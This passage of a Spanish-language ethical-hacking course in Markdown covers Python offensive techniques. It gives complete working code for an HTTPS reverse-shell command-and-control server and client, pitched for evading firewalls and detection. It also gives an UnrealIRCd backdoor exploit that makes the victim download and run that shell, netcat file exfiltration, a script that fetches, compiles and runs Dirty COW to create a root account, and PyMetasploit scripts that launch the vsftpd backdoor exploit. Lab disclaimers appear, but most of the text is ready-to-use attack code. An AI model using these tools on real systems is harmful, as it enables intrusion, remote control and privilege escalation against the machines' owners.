| M√°quina        | Rol               | Sugerencia                       |
| -------------- | ----------------- | -------------------------------- |
| Kali Linux     | Atacante          | Ejecuta el servidor con HTTPS    |
| Ubuntu/Windows | V√≠ctima           | Ejecuta el cliente shell reversa |
| Red            | Interna/Host-only | Para aislarlo de internet        |

---

### üì¶ Requisitos

#### üîß En ambas m√°quinas (atacante y v√≠ctima):

```bash
pip install requests flask
```

#### üîê Crear un certificado SSL autofirmado (para HTTPS)

En la **m√°quina atacante**, ejecuta:

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

Esto genera dos archivos:

- `key.pem`: clave privada
- `cert.pem`: certificado autofirmado

---

### üñ•Ô∏è Parte 1: Servidor Flask con HTTPS (atacante)

Guarda este archivo como `https_server.py`:

```python
# https_server.py
from flask import Flask, request
import ssl

app = Flask(__name__)

# Comando que se enviar√° a la v√≠ctima
comando_actual = "whoami"

@app.route('/', methods=['GET', 'POST'])
def controlar_shell():
    global comando_actual
    if request.method == 'GET':
        return comando_actual
    elif request.method == 'POST':
        salida = request.data.decode()
        print("[+] Resultado recibido de la v√≠ctima:\n", salida)
        return "OK"

@app.route('/set/<cmd>')
def cambiar_comando(cmd):
    global comando_actual
    comando_actual = cmd
    return f"Comando actualizado a: {cmd}"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8443, ssl_context=('cert.pem', 'key.pem'))
```

---

### üñ•Ô∏è Parte 2: Cliente Reverse Shell (v√≠ctima)

Guarda este archivo como `https_client.py`:

```python
# https_client.py
import requests
import subprocess
import time

server = "https://192.168.1.10:8443"  # Cambia a la IP del atacante
verify_ssl = False  # Ignora certificado autofirmado

while True:
    try:
        r = requests.get(server, verify=verify_ssl)
        comando = r.text.strip()

        if comando.lower() == "exit":
            break

        resultado = subprocess.getoutput(comando)
        print(f"[+] Ejecutando: {comando}")
        requests.post(server, data=resultado.encode(), verify=verify_ssl)

    except Exception as e:
        print(f"[!] Error de conexi√≥n: {e}")

    time.sleep(5)
```

> ‚ö†Ô∏è El cliente ignora la verificaci√≥n SSL para aceptar el certificado autofirmado. En producci√≥n, eso es peligroso, pero **en laboratorio es aceptable**.

---

### üîß Paso a paso para probarlo

#### üîπ En la m√°quina atacante (Kali, por ejemplo):

1. Crea el certificado SSL:

   ```bash
   openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
   ```

2. Ejecuta el servidor:

   ```bash
   python3 https_server.py
   ```

---

#### üîπ En la m√°quina v√≠ctima:

1. Edita la IP del atacante en `https_client.py`
2. Ejecuta el cliente:

   ```bash
   python3 https_client.py
   ```

---

### üß™ ¬øC√≥mo interactuar con la shell?

En el **servidor Flask** puedes cambiar el comando desde el navegador o curl:

```bash
curl https://localhost:8443/set/ls -k
```

O desde el navegador:

```
https://localhost:8443/set/ls
```

Y el cliente ejecutar√° ese comando en la siguiente iteraci√≥n.

---

### üé¨ Ejemplo de ejecuci√≥n

#### Servidor:

```
[+] Resultado recibido de la v√≠ctima:
kali
```

#### Cliente:

```
[+] Ejecutando: whoami
```

---

### ‚úÖ Ventajas de usar HTTPS

| Ventaja                 | Descripci√≥n                      |
| ----------------------- | -------------------------------- |
| üîê Cifrado              | Protege comandos y resultados    |
| üöÄ Evade firewalls      | HTTP/HTTPS suele estar permitido |
| üîç Dif√≠cil de detectar  | Parece tr√°fico web normal        |
| üß™ Ideal para practicar | T√©cnica realista para pruebas    |

---

### üõë Consideraciones legales

- ‚ö†Ô∏è **Nunca ejecutes esto fuera de un entorno de prueba.**
- ‚ö†Ô∏è No lo uses en redes reales sin permisos.
- ‚úÖ Ideal para estudiar en plataformas como:

  - TryHackMe (redes virtuales)
  - HackTheBox (laboratorios)
  - VirtualBox/VMware en red privada

---

### üß† ¬øQuieres mejorar esto?

Puedes:

- A√±adir autenticaci√≥n b√°sica
- Firmar certificados y verificar SSL
- Usar certificados v√°lidos (Let's Encrypt o localmente con CA)
- Implementar con WebSockets para comunicaci√≥n en tiempo real

---

[üîº](#√≠ndice)

---

## **223. Explota la vulnerabilidad UrealIRCd con una Shell cifrada**

### ¬øQu√© es la vulnerabilidad de UnrealIRCd 3.2.8.1?

**UnrealIRCd 3.2.8.1** descargado desde un **mirror comprometido** en 2009 incluye una **backdoor** (puerta trasera).

##### üéØ ¬øC√≥mo funciona?

- El servidor escucha normalmente en el puerto 6667 (IRC).
- Si alguien se conecta y le env√≠a una l√≠nea como:

```bash
AB;comando_a_ejecutar
```

El servidor ejecuta el comando directamente en el sistema.

‚úÖ ¬°As√≠ que podemos enviar cualquier comando remoto!

---

### Laboratorio de estudio

#### üñ•Ô∏è Necesitamos 2 m√°quinas virtuales:

| M√°quina                           | Rol      | Descripci√≥n                         |
| --------------------------------- | -------- | ----------------------------------- |
| Kali Linux                        | Atacante | Donde enviaremos el exploit         |
| Metasploitable 2 o Ubuntu antiguo | V√≠ctima  | Con UnrealIRCd vulnerable instalado |

#### üì° Red

Configura ambas en **"red interna" o "host-only"** para que se comuniquen entre s√≠ sin internet.

---

### Instalar UnrealIRCd vulnerable (si no usas Metasploitable)

En una VM de Ubuntu antigua (opcional, ya viene en Metasploitable 2):

```bash
sudo apt update
sudo apt install build-essential -y
wget https://downloads.sourceforge.net/project/unrealircd/Unreal3.2/unreal3.2.8.1.tar.gz
tar -zxvf unreal3.2.8.1.tar.gz
cd Unreal3.2.8.1
./Config  # Acepta todas las opciones por defecto
make
./unreal start
```

‚úîÔ∏è El servidor ahora escucha en el puerto **6667**.

---

### Crear una shell reversa cifrada (HTTPS)

#### üîê Paso 1: Crear certificado autofirmado

```bash
openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
```

---

#### üñ•Ô∏è Servidor HTTPS (atacante)

Guarda como `https_shell_server.py`:

```python
from flask import Flask, request
import ssl

app = Flask(__name__)
comando_actual = "whoami"

@app.route("/", methods=["GET", "POST"])
def shell():
    global comando_actual
    if request.method == "GET":
        return comando_actual
    else:
        resultado = request.data.decode()
        print("[+] Salida de la v√≠ctima:\n", resultado)
        return "OK"

@app.route("/set/<cmd>")
def set_cmd(cmd):
    global comando_actual
    comando_actual = cmd
    return f"Comando actualizado a: {cmd}"

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=8443, ssl_context=("cert.pem", "key.pem"))
```

Ejecuta con:

```bash
python3 https_shell_server.py
```

---

#### üñ•Ô∏è Cliente (v√≠ctima) ‚Äì Shell reversa en Python

Guarda como `https_shell_client.py`:

```python
import requests
import subprocess
import time

server_url = "https://192.168.56.1:8443"  # IP del atacante
verify_ssl = False

while True:
    try:
        comando = requests.get(server_url, verify=verify_ssl).text.strip()
        if comando == "exit":
            break
        salida = subprocess.getoutput(comando)
        requests.post(server_url, data=salida.encode(), verify=verify_ssl)
    except Exception as e:
        print("[!] Error:", e)
    time.sleep(5)
```

---

### Enviar la carga √∫til con la vulnerabilidad de UnrealIRCd

Ya que podemos ejecutar cualquier comando v√≠a la backdoor, vamos a lanzar el **cliente de shell reversa desde el atacante hacia la v√≠ctima**.

---

#### üî• Payload final (exploit)

En Kali, crea un comando que env√≠e `https_shell_client.py` a la v√≠ctima y lo ejecute.

#### ü™Ñ Paso a paso:

1. Crea un servidor HTTP simple para que la v√≠ctima descargue el script:

```bash
python3 -m http.server 8000
```

2. Enviar el comando usando la backdoor UnrealIRCd:

```python
import socket

def enviar_payload(target_ip, comando):
    payload = f"AB;{comando}\n"
    s = socket.socket()
    s.connect((target_ip, 6667))
    s.send(payload.encode())
    s.close()

# Comando para descargar y ejecutar el cliente reverse shell
cmd = "wget http://192.168.56.1:8000/https_shell_client.py -O /tmp/a.py; python3 /tmp/a.py"
enviar_payload("192.168.56.102", cmd)
```

> Aseg√∫rate de usar las IP correctas:
>
> - 192.168.56.1 ‚Üí atacante (Kali)
>
> - 192.168.56.102 ‚Üí v√≠ctima (Metasploitable o VM con UnrealIRCd)

---

### üé¨ Flujo completo

1. Atacante corre:

   - `https_shell_server.py` en puerto 8443
   - `python3 -m http.server 8000` para servir el cliente

2. V√≠ctima tiene UnrealIRCd corriendo en 6667
3. Atacante env√≠a payload v√≠a la backdoor
4. V√≠ctima ejecuta cliente ‚Üí se conecta a atacante v√≠a HTTPS
5. Atacante controla comandos v√≠a `/set/<comando>`

---

[üîº](#√≠ndice)

---

## **224. Transferencia de ficheros con Python: HTTPServer**

![HTTPSERVER](../img/4_Python_Hacking_Ciberseguridad_y_Hacking_Etico_con_Python/htppserver.jpg "HTTPSERVER")

### üß† ¬øQu√© es `HTTPServer` en Python?

Python incluye un servidor HTTP b√°sico incorporado que te permite **servir archivos desde cualquier directorio** en segundos. No necesitas instalar nada extra.

> Se usa mucho en **CTFs, pentesting, laboratorios** para compartir scripts, exploits, shells, etc.

---

### ‚úÖ ¬øQu√© puedes hacer con √©l?

- Compartir archivos desde tu m√°quina con otra (bajada de exploits, scripts, binarios).
- Transferir archivos desde la v√≠ctima al atacante (y viceversa).
- Servir una web falsa o payload si lo deseas.

---

### üîß Requisitos

- Solo necesitas **Python 3**
- Dos m√°quinas en la **misma red local o laboratorio**:

  - ‚úÖ **Atacante (servidor)**: ejecuta el `HTTPServer`
  - ‚úÖ **V√≠ctima (cliente)**: descarga el archivo desde el servidor

---

### üß™ Escenario de ejemplo

| M√°quina          | Rol      | IP local         |
| ---------------- | -------- | ---------------- |
| Kali Linux       | Atacante | `192.168.56.1`   |
| Metasploitable 2 | V√≠ctima  | `192.168.56.102` |

---

### üì¶ Parte 1: Servir archivos con HTTPServer

#### üìÅ Paso 1: Moverte al directorio del archivo

```bash
cd /home/kali/scripts/
```

Sup√≥n que tienes este archivo:

```bash
ls
reverse_shell_client.py
```

---

#### ‚ñ∂Ô∏è Paso 2: Ejecutar el servidor HTTP

```bash
python3 -m http.server 8000
```

Esto crea un servidor web en el **puerto 8000** sirviendo el contenido de ese directorio.

‚úîÔ∏è Ahora puedes acceder desde otra m√°quina usando:

```bash
http://192.168.56.1:8000
```

---

### üì• Parte 2: Descargar archivos desde otra m√°quina

En la m√°quina **v√≠ctima** (ej: Metasploitable):

```bash
wget http://192.168.56.1:8000/reverse_shell_client.py -O /tmp/shell.py
```

‚úÖ Esto descarga el archivo y lo guarda en `/tmp/shell.py`

---

### üß™ Ejemplo completo

#### üîπ En la m√°quina atacante (Kali):

```bash
cd /home/kali/exploits/
python3 -m http.server 8000
```

Salida:

```
Serving HTTP on 0.0.0.0 port 8000 ...
```

---

#### üîπ En la m√°quina v√≠ctima (Metasploitable):

```bash
wget http://192.168.56.1:8000/rev.py -O /tmp/a.py
python3 /tmp/a.py
```

‚úÖ Ahora est√°s ejecutando el script que serviste con HTTP.

---

### üõ†Ô∏è Extras √∫tiles

#### Cambiar puerto del servidor:

```bash
python3 -m http.server 9000
```

#### Cambiar la IP de escucha (por defecto escucha en 0.0.0.0)

```bash
python3 -m http.server 8000 --bind 127.0.0.1
```

#### Ver en navegador:

Abre en el navegador:

```
http://192.168.56.1:8000
```

---

### üß† ¬øPor qu√© es √∫til en hacking √©tico?

Porque puedes:

| Situaci√≥n           | Ejemplo                                                   |
| ------------------- | --------------------------------------------------------- |
| Subir una shell     | V√≠ctima descarga `reverse_shell.py` desde tu servidor     |
| Compartir exploits  | Enviar scripts desde Kali a m√°quinas vulnerables          |
| Automatizar         | Hacer que un payload se descargue y ejecute desde una URL |
| Phishing o payloads | Servir HTML, JS o binarios si haces ingenier√≠a social     |

---

### üîê Seguridad

Este servidor **no tiene autenticaci√≥n ni cifrado**. Es perfecto para laboratorios, pero en entornos reales:

- Nunca lo expongas a Internet
- Usa HTTPS si necesitas cifrado (con Flask + SSL)
- Usa autenticaci√≥n b√°sica si lo necesitas (con `http.server` extendido)

---

### üîÑ Alternativa: Transferencia inversa (v√≠ctima ‚Üí atacante)

En caso de querer **recibir archivos desde la v√≠ctima**, puedes usar:

#### En Kali:

```bash
nc -lvp 4444 > archivo.zip
```

#### En la v√≠ctima:

```bash
nc 192.168.56.1 4444 < archivo.zip
```

---

### ‚úÖ Resumen

| Acci√≥n                       | Comando r√°pido                   |
| ---------------------------- | -------------------------------- |
| Servir archivos              | `python3 -m http.server 8000`    |
| Descargar desde otra m√°quina | `wget http://IP:8000/archivo.py` |
| Cambiar puerto               | `python3 -m http.server 9000`    |

---

[üîº](#√≠ndice)

---

## **225. Explotaci√≥n del Kernel y elevaci√≥n de privilegios con Python**

### üß† ¬øQu√© es la explotaci√≥n del kernel?

El **kernel** es el n√∫cleo del sistema operativo: controla hardware, procesos, memoria y seguridad. Si una aplicaci√≥n con bajos privilegios (por ejemplo, un usuario normal) **encuentra una vulnerabilidad en el kernel**, puede aprovecharla para convertirse en **root o SYSTEM** (m√°xima autoridad en el sistema).

---

### üéØ ¬øQu√© es la elevaci√≥n de privilegios?

Es el proceso de **aumentar los privilegios del usuario actual** (por ejemplo, de "usuario normal" a "root") explotando errores o fallos en el sistema operativo, normalmente a trav√©s de:

- Vulnerabilidades del **kernel** (CVE conocidos).
- Archivos SUID mal configurados.
- Permisos de ejecuci√≥n indebidos.
- Servicios mal protegidos.

---

### üß™ Entorno de estudio recomendado

| Recurso                  | Uso                               |
| ------------------------ | --------------------------------- |
| Kali Linux               | M√°quina atacante                  |
| Metasploitable 2/3       | M√°quina vulnerable                |
| Ubuntu 16.04, 18.04      | Tambi√©n contienen CVEs del kernel |
| Red VirtualBox Host-Only | Comunicaci√≥n segura y aislada     |

---

### ‚öôÔ∏è Requisitos previos

- Python 3 instalado (ya viene en Kali y Ubuntu)
- Compilador GCC (para compilar exploits si es necesario)
- Acceso inicial como **usuario no root** en la m√°quina v√≠ctima
- Tener identificada una vulnerabilidad del kernel

---

### üìå CVE de ejemplo: `CVE-2017-16995` (kernel Ubuntu < 4.4.0-116)

Esta vulnerabilidad permite **ejecutar c√≥digo como root** desde un proceso con privilegios bajos.

---

#### üîç Paso 1: Verificar versi√≥n del kernel

En la v√≠ctima:

```bash
uname -a
```

Ejemplo de salida:

```bash
Linux ubuntu 4.4.0-62-generic #83-Ubuntu SMP ...
```

‚úÖ La versi√≥n `4.4.0-62` es vulnerable a `CVE-2017-16995`.

---

#### üîé Paso 2: Ver si tienes acceso a Python

```bash
which python3
```

O:

```bash
python3 --version
```

‚úÖ Necesitas Python para ejecutar scripts de exploit o cargar payloads como shells.

---

#### üí£ Paso 3: Descargar un exploit (en entorno controlado)

> Muchos exploits del kernel est√°n escritos en **C**, pero puedes **usarlos desde Python**, automatizar su ejecuci√≥n o incrustar payloads.

##### Ejemplo: Descargar un exploit p√∫blico

```bash
wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -O /tmp/dirty.c
gcc /tmp/dirty.c -o /tmp/dirty -pthread
chmod +x /tmp/dirty
```

##### Pero desde Python, puedes hacer algo como:

```python
import os
os.system("gcc /tmp/dirty.c -o /tmp/dirty -pthread && chmod +x /tmp/dirty")
os.system("/tmp/dirty")  # Ejecuta el exploit
```

---

### üêç ¬øC√≥mo se usa Python en la elevaci√≥n de privilegios?

1. **Automatizar explotaci√≥n**:

   - Compilar C, ejecutar, limpiar.

2. **Cargar payloads en memoria**

   - Como shells reversas, directamente desde Python.

3. **Validar vulnerabilidades**

   - Usar Python para inspeccionar versiones, configuraciones, permisos, flags SUID.

---

### üõ†Ô∏è Ejemplo pr√°ctico: Script Python para automatizar Dirty COW (CVE-2016-5195)

#### üêÆ ¬øQu√© hace Dirty COW?

Permite modificar archivos de solo lectura (como `/etc/passwd`) y crear un usuario root temporal.

#### üìú Python + C exploit

##### Paso 1: Guarda el siguiente exploit como `dirtycow.py` (automatiza todo)

```python
import os

print("[*] Descargando DirtyCOW...")
os.system("wget https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c -O /tmp/dirty.c")

print("[*] Compilando exploit...")
os.system("gcc /tmp/dirty.c -o /tmp/dirty -pthread")

print("[*] Ejecutando exploit...")
os.system("/tmp/dirty")

print("[*] Intenta iniciar sesi√≥n como usuario 'firefart' con contrase√±a 'dirtyCowFun'")
```

> üîë Este exploit crea un usuario `firefart` con contrase√±a `dirtyCowFun`.

##### Paso 2: Ejecuta el script

```bash
python3 dirtycow.py
```

##### Paso 3: Inicia sesi√≥n con:

```bash
su firefart
# Contrase√±a: dirtyCowFun
```

‚úÖ ¬°Ahora est√°s como root!

---

### üß† ¬øC√≥mo protegerse?

- Mantener el kernel actualizado
- Deshabilitar m√≥dulos innecesarios
- Aplicar parches de seguridad (usando `apt update && apt upgrade`)
- Supervisar accesos y permisos

---

### üì¶ Python √∫til en explotaci√≥n:

| Tarea                      | C√≥mo lo hace Python                        |
| -------------------------- | ------------------------------------------ |
| Ejecutar payloads          | `os.system()` o `subprocess.getoutput()`   |
| Leer versiones del sistema | `os.uname()`, `platform`, `subprocess`     |
| Automatizar exploits       | Descargar, compilar y ejecutar con c√≥digo  |
| Cargar c√≥digo en memoria   | Usar `ctypes`, `mmap` (t√©cnicas avanzadas) |

---

### üé¨ Mini-script para identificar kernel vulnerable

```python
import platform

def check_kernel():
    kernel = platform.uname().release
    print(f"Versi√≥n del kernel: {kernel}")

    vulnerable_versions = ["4.4.0-21", "4.4.0-62", "4.8.0-41"]
    if kernel in vulnerable_versions:
        print("‚ö†Ô∏è Este kernel puede ser vulnerable.")
    else:
        print("‚úîÔ∏è Este kernel parece seguro (o desconocido).")

check_kernel()
```

---

### ‚úÖ Resumen general

| Acci√≥n                      | Herramienta                        |
| --------------------------- | ---------------------------------- |
| Detectar versi√≥n del kernel | `uname -a` o `platform.uname()`    |
| Detectar vulnerabilidad     | Consultar CVEs por versi√≥n         |
| Descargar exploit           | `wget`, Python o manual            |
| Ejecutar con Python         | `os.system()` o `subprocess.run()` |
| Elevar privilegios          | Exploit con payload root           |

---

[üîº](#√≠ndice)

---

## **226. PyMetasploit: Metasploit con Python**

### üß† ¬øQu√© es PyMetasploit?

**PyMetasploit** es una librer√≠a que permite **interactuar con el framework Metasploit (MSF)** a trav√©s de su **API RPC (Remote Procedure Call)** usando Python.

Esto significa que puedes:

- Buscar y lanzar exploits.
- Interactuar con sesiones (meterpreter, shell, etc.).
- Automatizar ataques o escaneos.
- Crear herramientas ofensivas personalizadas.

---

### ‚úÖ ¬øCu√°ndo se usa PyMetasploit?

- Cuando quieres automatizar tareas con Metasploit.
- Cuando est√°s desarrollando tu propio framework.
- Cuando necesitas integrar MSF con otros sistemas Python.
- En **laboratorios de ciberseguridad, scripting y pentesting √©tico**.

---

### üîß Requisitos

| Requisito      | Descripci√≥n                                    |
| -------------- | ---------------------------------------------- |
| Kali Linux     | Incluye Metasploit preinstalado                |
| Python 3       | Lenguaje para escribir los scripts             |
| Ruby + MSF RPC | API del framework Metasploit                   |
| PyMetasploit3  | Librer√≠a que conecta Python con Metasploit RPC |

---

### üß™ Entorno de estudio recomendado

| M√°quina        | Rol      | Herramientas                    |
| -------------- | -------- | ------------------------------- |
| Kali Linux     | Atacante | Metasploit + Python             |
| Metasploitable | V√≠ctima  | M√°quina vulnerable para pruebas |

---

### üöÄ Paso 1: Instalar Metasploit (si no lo tienes)

En Kali ya viene instalado, pero si no lo tienes:

```bash
sudo apt update
sudo apt install metasploit-framework
```

---

### üöÄ Paso 2: Instalar PyMetasploit

Hay varias versiones, pero la m√°s usada actualmente es:

```bash
pip install pymetasploit3
```

‚úÖ Esto instala `pymetasploit3`, que se conecta a la API RPC de Metasploit.

---

### üöÄ Paso 3: Iniciar el servicio Metasploit RPC

Este servicio te permite controlar Metasploit desde fuera, como desde un script Python.

1. Abre Metasploit:

```bash
msfconsole
```

2. Lanza el servicio RPC:

```bash
load msgrpc Pass=123
```

‚úÖ Ahora tienes un **servidor RPC escuchando en localhost**, con contrase√±a `123`.

> Puedes cambiar el puerto y la IP si lo deseas (por ejemplo para usarlo desde otra m√°quina).

---

### üêç Paso 4: Script b√°sico con PyMetasploit

```python
from pymetasploit3.msfrpc import MsfRpcClient

# Conectarse al servicio RPC
client = MsfRpcClient('123')  # La misma contrase√±a usada en 'load msgrpc'

# Ver m√≥dulos disponibles
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
payload = client.modules.use('payload', 'cmd/unix/interact')

# Configurar opciones del exploit
exploit['RHOSTS'] = '192.168.56.102'
exploit['RPORT'] = 21

# Lanza el ataque
print("[*] Ejecutando exploit...")
exploit.execute(payload=payload)
```

‚úÖ Esto lanza el exploit vsftpd contra una m√°quina v√≠ctima vulnerable.

---

### üß™ Prueba con Metasploitable 2

1. Aseg√∫rate de que Metasploitable tenga el puerto 21 abierto:

```bash
nmap -p 21 192.168.56.102
```

2. Corre tu script Python desde Kali.

3. Mira si Metasploit recibe la sesi√≥n.

---

### üß† ¬øQu√© puedes hacer con PyMetasploit?

| Tarea                            | ¬øC√≥mo lo haces?                           |
| -------------------------------- | ----------------------------------------- |
| Lanzar un exploit                | `exploit.execute()`                       |
| Ver sesiones activas             | `client.sessions.list`                    |
| Ejecutar comandos en meterpreter | `session.run_with_output("whoami")`       |
| Listar m√≥dulos                   | `client.modules.exploits`                 |
| Automatizar escaneos             | Usar `auxiliary` modules                  |
| Escribir tu propio framework     | Crear una clase que use exploits + l√≥gica |

---

### üì¶ Ejemplo m√°s avanzado: obtener sesi√≥n y ejecutar comandos

```python
from pymetasploit3.msfrpc import MsfRpcClient
import time

client = MsfRpcClient('123')

# Usamos un exploit con payload
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
payload = client.modules.use('payload', 'cmd/unix/interact')
exploit['RHOSTS'] = '192.168.56.102'
exploit['RPORT'] = 21

print("[*] Ejecutando el exploit...")
job_id = exploit.execute(payload=payload)

# Esperamos a que la sesi√≥n aparezca
print("[*] Esperando sesi√≥n...")
time.sleep(5)

# Mostramos sesiones activas
sessions = client.sessions.list
print(sessions)

# Ejecutamos comandos si hay sesi√≥n activa
if sessions:
    sid = list(sessions.keys())[0]
    session = client.sessions.session(sid)
    output = session.run_with_output('whoami')
    print(f"[+] Salida del comando:\n{output}")
```

---

### ‚ö†Ô∏è Seguridad y pr√°ctica responsable

- Solo usa Metasploit y PyMetasploit en **entornos de laboratorio**.
- No lances exploits en redes que no te pertenecen.
- Usa m√°quinas vulnerables como **Metasploitable, TryHackMe, HackTheBox**, etc.

---

### ‚úÖ Resumen

| Componente          | Descripci√≥n                        |
| ------------------- | ---------------------------------- |
| `msfconsole`        | Lanza Metasploit                   |
| `load msgrpc`       | Inicia el servicio RPC             |
| `pymetasploit3`     | Librer√≠a Python para controlar MSF |
| `exploit.execute()` | Ejecuta un exploit con payload     |
| `client.sessions`   | Accede a las sesiones activas      |

---

[üîº](#√≠ndice)

---

## **227. PyMetasploit: Enumeraci√≥n y filtrado de m√≥dulos y exploits**

### üß† ¬øQu√© es la enumeraci√≥n de m√≥dulos en Metasploit?

En Metasploit, los "m√≥dulos" son piezas de c√≥digo que hacen tareas espec√≠ficas:

- `exploit`: Ataques a sistemas o servicios.
- `auxiliary`: Esc√°neres, DoS, recopilaci√≥n de info, etc.
- `post`: Tareas despu√©s de la explotaci√≥n.
- `payload`: C√≥digo que se ejecuta despu√©s de un exploit (como una shell).
- `encoder`, `nop`, etc.

Con **PyMetasploit**, puedes **listar, filtrar, buscar y analizar** estos m√≥dulos desde Python.

---

### ‚úÖ Requisitos previos (resumen r√°pido)

Aseg√∫rate de tener todo listo:

1. **Instalar PyMetasploit3**:

   ```bash
   pip install pymetasploit3
   ```

2. **Iniciar Metasploit RPC desde msfconsole**:

   ```bash
   msfconsole
   msf6 > load msgrpc Pass=123
   ```

3. **Python 3 y Metasploit Framework instalados** (en Kali Linux ya viene todo).

---

### üöÄ 1. Conectarse a Metasploit desde Python

```python
from pymetasploit3.msfrpc import MsfRpcClient

# Contrase√±a que pusiste en msfconsole con 'load msgrpc Pass=123'
client = MsfRpcClient('123')
```

---

### üìö 2. Listar todos los m√≥dulos por tipo

```python
# Listar exploits
exploit_list = client.modules.exploits
print(f"Total de exploits: {len(exploit_list)}")
print("Ejemplo:", exploit_list[:5])  # Mostrar los primeros 5

# Listar payloads
payloads = client.modules.payloads
print(f"\nTotal de payloads: {len(payloads)}")

# Listar auxiliares
aux_list = client.modules.auxiliary
print(f"\nTotal de m√≥dulos auxiliary: {len(aux_list)}")
```

#### üß™ Salida esperada:

```text
Total de exploits: 2100
Ejemplo: ['exploit/unix/ftp/vsftpd_234_backdoor', 'exploit/windows/smb/ms17_010_eternalblue', ...]
```

---

### üîç 3. Filtrar m√≥dulos por palabra clave

Sup√≥n que buscas exploits relacionados con **samba**:

```python
samba_exploits = [e for e in client.modules.exploits if 'samba' in e.lower()]
print(f"Exploit que contienen 'samba': {len(samba_exploits)}")
for e in samba_exploits:
    print(f"- {e}")
```

Puedes hacerlo tambi√©n con `windows`, `ftp`, `web`, etc.

---

### üß† 4. Mostrar informaci√≥n de un m√≥dulo espec√≠fico

Por ejemplo: `exploit/unix/ftp/vsftpd_234_backdoor`

```python
exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')

print("[*] Informaci√≥n del m√≥dulo:")
print(f"Nombre: {exploit.name}")
print(f"Descripci√≥n: {exploit.description}")
print(f"Requiere sesi√≥n: {exploit.requires_session}")
print(f"Plataforma: {exploit.platform}")
print(f"Tipo: {exploit.type}")

print("\n[*] Opciones disponibles:")
for option, data in exploit.options.items():
    print(f"- {option}: {data['desc']} (Requerido: {data['required']})")
```

---

### üéØ 5. Filtrar exploits por plataforma o tipo de ataque

Por ejemplo: todos los exploits que contengan ‚Äúwindows/smb‚Äù

```python
windows_smb_exploits = [
    e for e in client.modules.exploits if 'windows/smb' in e.lower()
]

print(f"Exploits Windows SMB encontrados: {len(windows_smb_exploits)}")
for e in windows_smb_exploits:
    print(f"- {e}")
```

Puedes automatizar b√∫squedas por:

- Protocolo (ftp, ssh, smb, http‚Ä¶)
- Sistema operativo (windows, linux‚Ä¶)
- CVE (por ejemplo: `cve_2021`)

---

### üéõÔ∏è 6. Crear buscador interactivo

```python
def buscar_exploits(keyword):
    keyword = keyword.lower()
    encontrados = [e for e in client.modules.exploits if keyword in e.lower()]
    print(f"\nExploit con '{keyword}': {len(encontrados)} encontrados")
    for e in encontrados:
        print(f"- {e}")

buscar_exploits("smb")
```

Puedes modificar esto para usar `input()` y crear un men√∫ interactivo de b√∫squeda.

---

### üß™ Extra: listar exploits que tengan payloads compatibles

```python
exp = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
payloads = exp.compatible_payloads
print("Payloads compatibles:")
for p in payloads:
    print(f"- {p}")
```

---

### ‚úÖ BONUS: script completo para enumerar y filtrar exploits

```python
from pymetasploit3.msfrpc import MsfRpcClient

client = MsfRpcClient('123')

def buscar_exploits(palabra):
    resultados = [e for e in client.modules.exploits if palabra in e.lower()]
    print(f"\nüîç Exploits que contienen '{palabra}':")
    for r in resultados:
        print(f"- {r}")
    print(f"\nTotal encontrados: {len(resultados)}")

def info_exploit(nombre):
    e = client.modules.use('exploit', nombre)
    print(f"\nüìå Informaci√≥n de: {nombre}")
    print(f"Nombre: {e.name}")
    print(f"Descripci√≥n: {e.description}")
    print(f"Plataforma: {e.platform}")
    print("\nOpciones requeridas:")
    for opt in e.options:
        print(f"- {opt}")

# B√∫squeda por palabra clave
buscar_exploits('ftp')

# Mostrar informaci√≥n detallada de un exploit
info_exploit('unix/ftp/vsftpd_234_backdoor')
```

---

### üì¶ ¬øD√≥nde se puede practicar?

- üß± **Metasploitable 2**: perfecta para escanear con `ftp`, `smb`, `http`, etc.
- üß™ **TryHackMe / HackTheBox**: te permiten practicar esto en escenarios guiados.
- üß† **Tu propio laboratorio** con VirtualBox o VMware.

---

### üß† Conclusi√≥n

| Tarea                     | C√≥digo usado                      |
| ------------------------- | --------------------------------- |
| Conexi√≥n con Metasploit   | `MsfRpcClient('password')`        |
| Listar m√≥dulos            | `client.modules.exploits`         |
| Filtrar por palabra clave | List comprehensions               |
| Ver detalles del m√≥dulo   | `exploit.description`, `.options` |
| Ver payloads compatibles  | `exploit.compatible_payloads`     |

---

[üîº](#√≠ndice)

---

## **228. PyMetasploit: Configuraci√≥n y ejecuci√≥n de exploits**

### üß† ¬øQu√© es PyMetasploit?

**PyMetasploit3** es una librer√≠a de Python que te permite interactuar con el **Metasploit Framework** mediante su **API RPC**. Es ideal para automatizar tareas de seguridad ofensiva como:

- B√∫squeda y configuraci√≥n de exploits.
- Ejecuci√≥n de payloads.
- Gesti√≥n de sesiones meterpreter/shell.
- Automatizaci√≥n de pruebas de penetraci√≥n.

---

### üéØ Objetivo de hoy

Vamos a ver **paso a paso c√≥mo:**

1. Instalar PyMetasploit3 y configurar el entorno.
2. Conectarse al Metasploit RPC.
3. Cargar un exploit.
4. Configurar sus par√°metros.
5. Seleccionar un payload compatible.
6. Ejecutar el exploit.
7. Verificar si se abre una sesi√≥n.

---

### ‚úÖ Entorno de estudio recomendado

| M√°quina         | Rol      | SO           | Herramientas          |
| --------------- | -------- | ------------ | --------------------- |
| Kali Linux      | Atacante | Linux        | Python, Metasploit    |
| Metasploitable2 | V√≠ctima  | Linux Ubuntu | Servicios vulnerables |

> Puedes usar VirtualBox o VMware para crear este laboratorio.

---

### üîß Paso 1: Instalaci√≥n del entorno

#### ‚ñ∂Ô∏è Instala Metasploit (si usas otra distro distinta a Kali)

```bash
sudo apt update
sudo apt install metasploit-framework
```

#### ‚ñ∂Ô∏è Instala PyMetasploit3

```bash
pip install pymetasploit3
```

---

### üöÄ Paso 2: Iniciar Metasploit RPC

Desde una terminal, abre Metasploit con:

```bash
msfconsole
```

Y dentro de `msfconsole` ejecuta:

```bash
load msgrpc Pass=123
```

Esto carga el servicio RPC de Metasploit con la contrase√±a `123`.

